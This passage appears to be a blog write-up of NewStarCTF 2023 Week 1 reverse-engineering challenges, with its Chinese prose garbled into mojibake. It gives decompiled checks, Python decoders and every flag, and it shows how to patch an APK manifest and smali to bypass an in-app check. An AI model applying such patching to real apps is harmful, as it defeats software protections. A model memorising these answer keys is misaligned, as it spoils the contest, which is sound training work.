class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">_BYTE *__fastcall <span class="title function_">encode</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> v1; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// eax</span></span><br><span class="line">  _BYTE *v4; <span class="comment">// [rsp+20h] [rbp-20h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+28h] [rbp-18h]</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [rsp+2Ch] [rbp-14h]</span></span><br><span class="line"></span><br><span class="line">  v1 = <span class="built_in">strlen</span>(a1);</span><br><span class="line">  v4 = <span class="built_in">malloc</span>(<span class="number">2</span> * v1 + <span class="number">1</span>);</span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(a1); ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = v6++;</span><br><span class="line">    v4[v2] = (a1[i] ^ <span class="number">0x20</span>) + <span class="number">16</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v4[v6] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å†™å‡ºpythonè§£å¯†è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">a=<span class="string">&#x27;V\QWkt $_e\&#x27;^_ggXQ\&#x27;u|v!c/m&#x27;</span></span><br><span class="line">b=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    b+=<span class="built_in">chr</span>((<span class="built_in">ord</span>(i)-<span class="number">16</span>)^<span class="number">0x20</span>)</span><br><span class="line"><span class="built_in">print</span>(b)</span><br></pre></td></tr></table></figure><p>å¾—åˆ°flagï¼š<code>flag&#123;D04ou7nowwha7ELF1s?&#125;</code></p><h3 id="Endian"><a href="#Endian" class="headerlink" title="Endian"></a>Endian</h3><p>åç¼–è¯‘ï¼Œå¾—åˆ°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+4h] [rbp-3Ch]</span></span><br><span class="line">  <span class="type">char</span> *v5; <span class="comment">// [rsp+8h] [rbp-38h]</span></span><br><span class="line">  <span class="type">char</span> v6[<span class="number">40</span>]; <span class="comment">// [rsp+10h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v7; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;please input your flag&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%s&quot;</span>, v6);</span><br><span class="line">  v5 = v6;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">4</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *(_DWORD *)v5 != (<span class="built_in">array</span>[i] ^ <span class="number">0x12345678</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;wrong!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    v5 += <span class="number">4</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;you are right&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…¶ä¸­arrayä¸º<code>dd 75553A1Eh, 7B583A03h, 4D58220Ch, 7B50383Dh, 736B3819h, 0</code>ï¼Œshift+eæå–æ•°ç»„å…ƒç´ ï¼Œå†™å‡ºpythonè„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">arrr=[ <span class="number">1968519710</span>, <span class="number">2069379587</span>, <span class="number">1297621516</span>, <span class="number">2068854845</span>, <span class="number">1936406553</span>, <span class="number">0</span> ]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> arrr:</span><br><span class="line">    h=((i^<span class="number">0x12345678</span>))</span><br><span class="line">    value = h</span><br><span class="line"></span><br><span class="line">    nums = []</span><br><span class="line">    <span class="keyword">while</span> value &gt; <span class="number">0</span>:</span><br><span class="line">        nums.append(<span class="built_in">hex</span>(value &amp; <span class="number">0xFF</span>)) <span class="comment"># å–å‡ºä½ä½éƒ¨åˆ†ï¼Œå¹¶è½¬æ¢ä¸º16è¿›åˆ¶å­—ç¬¦ä¸²</span></span><br><span class="line">        value &gt;&gt;= <span class="number">8</span> <span class="comment"># å³ç§»8ä½ï¼Œè·å–ä¸‹ä¸€ä¸ªä½ç½®çš„éƒ¨åˆ†</span></span><br><span class="line">    nums_str = [<span class="built_in">chr</span>(<span class="built_in">int</span>(num,<span class="number">16</span>)) <span class="keyword">for</span> num <span class="keyword">in</span> nums]</span><br><span class="line">    result_str = <span class="string">&#x27;&#x27;</span>.join(nums_str)</span><br><span class="line">    <span class="built_in">print</span>(result_str,end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><p>æ‰§è¡Œæ‹¿åˆ°flagï¼š<code>flag&#123;llittl_Endian_axV4</code></p><p>ä¿®æ”¹ä¸€ä¸‹å¾—åˆ°æœ€åflagï¼š<code>flag&#123;llittl_Endian_a&#125;</code></p><h3 id="AndroXor"><a href="#AndroXor" class="headerlink" title="AndroXor"></a>AndroXor</h3><p>Android killeræ‰“å¼€ï¼Œjavaåç¼–è¯‘ï¼Œå…¥å£å¤„com.chick.androxor.MainActivityå¾—åˆ°å…³é”®å‡½æ•°ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">Xor</span><span class="params">(String paramString1, String paramString2)</span></span><br><span class="line"> &#123;</span><br><span class="line">   <span class="type">char</span>[] arrayOfChar = <span class="keyword">new</span> <span class="title class_">char</span>[paramString1.length()];</span><br><span class="line">   <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> paramString1.length();</span><br><span class="line">   <span class="type">String</span> <span class="variable">str1</span> <span class="operator">=</span> <span class="string">&quot;wrong!!!&quot;</span>;</span><br><span class="line">   String str2;</span><br><span class="line">   <span class="keyword">if</span> (i != <span class="number">25</span>) &#123;</span><br><span class="line">     str2 = <span class="string">&quot;wrong!!!&quot;</span>;</span><br><span class="line">   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">     str2 = <span class="string">&quot;you win!!!&quot;</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; paramString1.length(); i++)</span><br><span class="line">   &#123;</span><br><span class="line">     <span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> (<span class="type">char</span>)(paramString1.charAt(i) ^ paramString2.charAt(i % paramString2.length()));</span><br><span class="line">     arrayOfChar[i] = ((<span class="type">char</span>)j);</span><br><span class="line">     <span class="keyword">if</span> (<span class="keyword">new</span> <span class="title class_">char</span>[] &#123; <span class="number">14</span>, <span class="number">13</span>, <span class="number">17</span>, <span class="number">23</span>, <span class="number">2</span>, <span class="number">75</span>, <span class="number">73</span>, <span class="number">55</span>, <span class="number">32</span>, <span class="number">30</span>, <span class="number">20</span>, <span class="number">73</span>, <span class="number">10</span>, <span class="number">2</span>, <span class="number">12</span>, <span class="number">62</span>, <span class="number">40</span>, <span class="number">64</span>, <span class="number">11</span>, <span class="number">39</span>, <span class="number">75</span>, <span class="number">89</span>, <span class="number">25</span>, <span class="number">65</span>, <span class="number">13</span> &#125;[i] != j)</span><br><span class="line">     &#123;</span><br><span class="line">       str2 = str1;</span><br><span class="line">       <span class="keyword">break</span>;</span><br><span class="line">     &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> str2;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>åœ¨com.chick.androxor.MainActivity$1ç±»ä¸­å¾—åˆ°keyä¸ºhappyx3</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View paramView)</span></span><br><span class="line"> &#123;</span><br><span class="line">   <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> <span class="built_in">this</span>.val$password.getText().toString();</span><br><span class="line">   paramView = <span class="built_in">this</span>.<span class="built_in">this</span>$<span class="number">0</span>;</span><br><span class="line">   Toast.makeText(paramView, paramView.Xor(str, <span class="string">&quot;happyx3&quot;</span>), <span class="number">1</span>).show();</span><br><span class="line">   Log.d(<span class="string">&quot;è¾“å…¥&quot;</span>, <span class="built_in">this</span>.val$password.getText().toString());</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>ç¼–å†™pythonè„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">key = <span class="string">&quot;happyx3&quot;</span></span><br><span class="line">cipher = [<span class="number">14</span>, <span class="number">13</span>, <span class="number">17</span>, <span class="number">23</span>, <span class="number">2</span>, <span class="number">75</span>, <span class="number">73</span>, <span class="number">55</span>, <span class="number">32</span>, <span class="number">30</span>, <span class="number">20</span>, <span class="number">73</span>, <span class="number">10</span>, <span class="number">2</span>, <span class="number">12</span>, <span class="number">62</span>, <span class="number">40</span>, <span class="number">64</span>, <span class="number">11</span>, <span class="number">39</span>, <span class="number">75</span>, <span class="number">89</span>, <span class="number">25</span>, <span class="number">65</span>, <span class="number">13</span>]</span><br><span class="line"></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(cipher)):</span><br><span class="line">    result += <span class="built_in">chr</span>(cipher[i] ^ <span class="built_in">ord</span>(key[i % <span class="built_in">len</span>(key)]))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure><p>å¾—åˆ°flagï¼š<code>flag&#123;3z_And0r1d_X0r_x1x1&#125;</code></p><h3 id="lazy-activtiy"><a href="#lazy-activtiy" class="headerlink" title="lazy_activtiy"></a>lazy_activtiy</h3><p>å®‰è£…apkåæ‰“å¼€å‘ç°è¦æ±‚æˆ‘ä»¬æ‰“å¼€å¦ä¸€ä¸ªActivityæ¥è·å¾—flag</p><p>æŸ¥çœ‹apké…ç½®æ–‡ä»¶AndroidManifest.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span> standalone=<span class="string">&quot;no&quot;</span>?&gt;</span><span class="tag">&lt;<span class="name">manifest</span> <span class="attr">xmlns:android</span>=<span class="string">&quot;http://schemas.android.com/apk/res/android&quot;</span> <span class="attr">android:compileSdkVersion</span>=<span class="string">&quot;32&quot;</span> <span class="attr">android:compileSdkVersionCodename</span>=<span class="string">&quot;12&quot;</span> <span class="attr">package</span>=<span class="string">&quot;com.droidlearn.activity_travel&quot;</span> <span class="attr">platformBuildVersionCode</span>=<span class="string">&quot;32&quot;</span> <span class="attr">platformBuildVersionName</span>=<span class="string">&quot;12&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">application</span> <span class="attr">android:allowBackup</span>=<span class="string">&quot;true&quot;</span> <span class="attr">android:appComponentFactory</span>=<span class="string">&quot;androidx.core.app.CoreComponentFactory&quot;</span> <span class="attr">android:dataExtractionRules</span>=<span class="string">&quot;@xml/data_extraction_rules&quot;</span> <span class="attr">android:fullBackupContent</span>=<span class="string">&quot;@xml/backup_rules&quot;</span> <span class="attr">android:icon</span>=<span class="string">&quot;@mipmap/ic_launcher&quot;</span> <span class="attr">android:label</span>=<span class="string">&quot;@string/app_name&quot;</span> <span class="attr">android:roundIcon</span>=<span class="string">&quot;@mipmap/ic_launcher_round&quot;</span> <span class="attr">android:supportsRtl</span>=<span class="string">&quot;true&quot;</span> <span class="attr">android:theme</span>=<span class="string">&quot;@style/Theme.Activity_Travel&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:exported</span>=<span class="string">&quot;false&quot;</span> <span class="attr">android:name</span>=<span class="string">&quot;com.droidlearn.activity_travel.FlagActivity&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:exported</span>=<span class="string">&quot;true&quot;</span> <span class="attr">android:name</span>=<span class="string">&quot;com.droidlearn.activity_travel.MainActivity&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.action.MAIN&quot;</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.category.LAUNCHER&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">activity</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">application</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">manifest</span>&gt;</span></span><br></pre></td></tr></table></figure><p>å°†å…¥å£å¤„æ”¹ä¸ºFlagActivityï¼Œå¹¶ä¸”æŠŠFlagActivityçš„exportedæ”¹ä¸ºtrue</p><p>æ”¹åxmlæ–‡ä»¶å¦‚ä¸‹</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span> standalone=<span class="string">&quot;no&quot;</span>?&gt;</span><span class="tag">&lt;<span class="name">manifest</span> <span class="attr">xmlns:android</span>=<span class="string">&quot;http://schemas.android.com/apk/res/android&quot;</span> <span class="attr">android:compileSdkVersion</span>=<span class="string">&quot;32&quot;</span> <span class="attr">android:compileSdkVersionCodename</span>=<span class="string">&quot;12&quot;</span> <span class="attr">package</span>=<span class="string">&quot;com.droidlearn.activity_travel&quot;</span> <span class="attr">platformBuildVersionCode</span>=<span class="string">&quot;32&quot;</span> <span class="attr">platformBuildVersionName</span>=<span class="string">&quot;12&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">application</span> <span class="attr">android:allowBackup</span>=<span class="string">&quot;true&quot;</span> <span class="attr">android:appComponentFactory</span>=<span class="string">&quot;androidx.core.app.CoreComponentFactory&quot;</span> <span class="attr">android:dataExtractionRules</span>=<span class="string">&quot;@xml/data_extraction_rules&quot;</span> <span class="attr">android:fullBackupContent</span>=<span class="string">&quot;@xml/backup_rules&quot;</span> <span class="attr">android:icon</span>=<span class="string">&quot;@mipmap/ic_launcher&quot;</span> <span class="attr">android:label</span>=<span class="string">&quot;@string/app_name&quot;</span> <span class="attr">android:roundIcon</span>=<span class="string">&quot;@mipmap/ic_launcher_round&quot;</span> <span class="attr">android:supportsRtl</span>=<span class="string">&quot;true&quot;</span> <span class="attr">android:theme</span>=<span class="string">&quot;@style/Theme.Activity_Travel&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:exported</span>=<span class="string">&quot;true&quot;</span> <span class="attr">android:name</span>=<span class="string">&quot;com.droidlearn.activity_travel.FlagActivity&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.action.MAIN&quot;</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.category.LAUNCHER&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:exported</span>=<span class="string">&quot;true&quot;</span> <span class="attr">android:name</span>=<span class="string">&quot;com.droidlearn.activity_travel.MainActivity&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;/<span class="name">activity</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">application</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">manifest</span>&gt;</span></span><br></pre></td></tr></table></figure><p>é‡æ–°ç¼–è¯‘åæ‰“å¼€ï¼Œå‘ç°è¦æ±‚ç‚¹å‡»æŒ‰é’®10000æ¬¡æ‰èƒ½è·å¾—flagã€‚</p><p>åˆ†æsmaliè¯­å¥</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line">.<span class="keyword">class</span> <span class="title class_">Lcom</span>/droidlearn/activity_travel/FlagActivity$<span class="number">1</span>;</span><br><span class="line">.<span class="built_in">super</span> Ljava/lang/Object;</span><br><span class="line">.source <span class="string">&quot;FlagActivity.java&quot;</span></span><br><span class="line"></span><br><span class="line"># interfaces</span><br><span class="line">.<span class="keyword">implements</span> <span class="title class_">Landroid</span>/view/View$OnClickListener;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># annotations</span><br><span class="line">.annotation system Ldalvik/annotation/EnclosingMethod;</span><br><span class="line">    value = Lcom/droidlearn/activity_travel/FlagActivity;-&gt;onCreate(Landroid/os/Bundle;)V</span><br><span class="line">.end annotation</span><br><span class="line"></span><br><span class="line">.annotation system Ldalvik/annotation/InnerClass;</span><br><span class="line">    accessFlags = <span class="number">0x0</span></span><br><span class="line">    name = <span class="literal">null</span></span><br><span class="line">.end annotation</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># instance fields</span><br><span class="line">.field <span class="keyword">final</span> synthetic <span class="built_in">this</span>$<span class="number">0</span>:Lcom/droidlearn/activity_travel/FlagActivity;</span><br><span class="line"></span><br><span class="line">.field <span class="keyword">final</span> synthetic val$str:Landroid/widget/EditText;</span><br><span class="line"></span><br><span class="line">.field <span class="keyword">final</span> synthetic val$tv_cnt:Landroid/widget/TextView;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># direct methods</span><br><span class="line">.method constructor &lt;init&gt;(Lcom/droidlearn/activity_travel/FlagActivity;Landroid/widget/TextView;Landroid/widget/EditText;)V</span><br><span class="line">    .locals <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    .line <span class="number">20</span></span><br><span class="line">    iput-object p1, p0, Lcom/droidlearn/activity_travel/FlagActivity$<span class="number">1</span>;-&gt;<span class="built_in">this</span>$<span class="number">0</span>:Lcom/droidlearn/activity_travel/FlagActivity;</span><br><span class="line"></span><br><span class="line">    iput-object p2, p0, Lcom/droidlearn/activity_travel/FlagActivity$<span class="number">1</span>;-&gt;val$tv_cnt:Landroid/widget/TextView;</span><br><span class="line"></span><br><span class="line">    iput-object p3, p0, Lcom/droidlearn/activity_travel/FlagActivity$<span class="number">1</span>;-&gt;val$str:Landroid/widget/EditText;</span><br><span class="line"></span><br><span class="line">    invoke-direct &#123;p0&#125;, Ljava/lang/Object;-&gt;&lt;init&gt;()V</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span>-<span class="keyword">void</span></span><br><span class="line">.end method</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># virtual methods</span><br><span class="line">.method <span class="keyword">public</span> <span class="title function_">onClick</span><span class="params">(Landroid/view/View;)</span>V</span><br><span class="line">    .locals <span class="number">2</span></span><br><span class="line"></span><br><span class="line">    .line <span class="number">23</span></span><br><span class="line">    iget-object p1, p0, Lcom/droidlearn/activity_travel/FlagActivity$<span class="number">1</span>;-&gt;val$tv_cnt:Landroid/widget/TextView;</span><br><span class="line"></span><br><span class="line">    iget-object v0, p0, Lcom/droidlearn/activity_travel/FlagActivity$<span class="number">1</span>;-&gt;<span class="built_in">this</span>$<span class="number">0</span>:Lcom/droidlearn/activity_travel/FlagActivity;</span><br><span class="line"></span><br><span class="line">    invoke-<span class="keyword">static</span> &#123;v0&#125;, Lcom/droidlearn/activity_travel/FlagActivity;-&gt;access$<span class="number">004</span>(Lcom/droidlearn/activity_travel/FlagActivity;)I</span><br><span class="line"></span><br><span class="line">    move-result v0</span><br><span class="line"></span><br><span class="line">    invoke-<span class="keyword">static</span> &#123;v0&#125;, Ljava/lang/Integer;-&gt;toString(I)Ljava/lang/String;</span><br><span class="line"></span><br><span class="line">    move-result-object v0</span><br><span class="line"></span><br><span class="line">    invoke-virtual &#123;p1, v0&#125;, Landroid/widget/TextView;-&gt;setText(Ljava/lang/CharSequence;)V</span><br><span class="line"></span><br><span class="line">    .line <span class="number">24</span></span><br><span class="line">    iget-object p1, p0, Lcom/droidlearn/activity_travel/FlagActivity$<span class="number">1</span>;-&gt;<span class="built_in">this</span>$<span class="number">0</span>:Lcom/droidlearn/activity_travel/FlagActivity;</span><br><span class="line"></span><br><span class="line">    invoke-<span class="keyword">static</span> &#123;p1&#125;, Lcom/droidlearn/activity_travel/FlagActivity;-&gt;access$<span class="number">000</span>(Lcom/droidlearn/activity_travel/FlagActivity;)I</span><br><span class="line"></span><br><span class="line">    move-result p1</span><br><span class="line"></span><br><span class="line">    const/<span class="number">16</span> v0, <span class="number">0x2710</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>-lt p1, v0, :cond_0</span><br><span class="line"></span><br><span class="line">    .line <span class="number">25</span></span><br><span class="line">    iget-object p1, p0, Lcom/droidlearn/activity_travel/FlagActivity$<span class="number">1</span>;-&gt;<span class="built_in">this</span>$<span class="number">0</span>:Lcom/droidlearn/activity_travel/FlagActivity;</span><br><span class="line"></span><br><span class="line">    iget-object v0, p0, Lcom/droidlearn/activity_travel/FlagActivity$<span class="number">1</span>;-&gt;val$str:Landroid/widget/EditText;</span><br><span class="line"></span><br><span class="line">    invoke-virtual &#123;v0&#125;, Landroid/widget/EditText;-&gt;getText()Landroid/text/Editable;</span><br><span class="line"></span><br><span class="line">    move-result-object v0</span><br><span class="line"></span><br><span class="line">    invoke-virtual &#123;v0&#125;, Ljava/lang/Object;-&gt;toString()Ljava/lang/String;</span><br><span class="line"></span><br><span class="line">    move-result-object v0</span><br><span class="line"></span><br><span class="line">    const/<span class="number">4</span> v1, <span class="number">0x0</span></span><br><span class="line"></span><br><span class="line">    invoke-<span class="keyword">static</span> &#123;p1, v0, v1&#125;, Landroid/widget/Toast;-&gt;makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;</span><br><span class="line"></span><br><span class="line">    move-result-object p1</span><br><span class="line"></span><br><span class="line">    invoke-virtual &#123;p1&#125;, Landroid/widget/Toast;-&gt;show()V</span><br><span class="line"></span><br><span class="line">    :cond_0</span><br><span class="line">    <span class="keyword">return</span>-<span class="keyword">void</span></span><br><span class="line">.end method</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å‘ç°å…¶ä¸­çš„<code>const/16 v0, 0x2710</code>ï¼Œå…¶å­˜å‚¨ä¸ºç‚¹å‡»æ¬¡æ•°ï¼Œå°†å…¶æ”¹ä¸º0x1ï¼Œé‡æ–°ç¼–è¯‘å®‰è£…ï¼Œæ‰“å¼€åç‚¹å‡»æŒ‰é’®ç›´æ¥å¾—åˆ°flag</p><img src="/2023/09/26/2023newstarctfWeek1/apkre.png" class=""><p><code>flag&#123;Act1v1ty_!s_so00oo0o_lmpor#an#&#125;</code></p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><p>è§£é¢˜ 10&#x2F;10</p><h3 id="brainfuck"><a href="#brainfuck" class="headerlink" title="brainfuck"></a>brainfuck</h3><p>ä¸‹è½½é™„ä»¶ï¼Œå¾—åˆ°</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 